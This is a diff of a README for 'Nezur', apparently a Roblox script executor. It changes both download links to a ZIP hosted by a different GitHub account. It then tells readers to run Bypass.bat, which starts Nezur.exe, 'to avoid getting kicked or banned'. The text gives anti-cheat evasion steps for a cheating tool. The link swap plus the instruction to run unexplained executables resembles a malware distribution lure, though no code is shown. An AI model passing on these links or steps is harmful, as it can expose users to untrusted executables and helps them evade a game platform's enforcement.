@@ -8,10 +8,10 @@
 
 Available on the #Microsoft Store & Web version of Roblox.
 Important: 🚨 Make sure to run Bypass.bat before launching Nezur to avoid getting kicked or banned! 🚨
-Download  [Nezur](https://github.com/Nezur-External/Nezur-External/archive/refs/heads/main.zip) 📁
+Download  [Nezur](https://github.com/nezurrz/Nezur-Executor-2024/archive/refs/heads/main.zip) 📁
 
 # 📚 Tutorial:
-- Download  [Nezur](https://github.com/Nezur-External/Nezur-External/archive/refs/heads/main.zip) 📥
+- Download  [Nezur](https://github.com/nezurrz/Nezur-Executor-2024/archive/refs/heads/main.zip) 📥
 - Extract the ZIP file 📂
 - Run Bypass.bat (it will automatically run Nezur.exe) 🎯
 - Launch any Roblox game you want to use scripts in 🎮
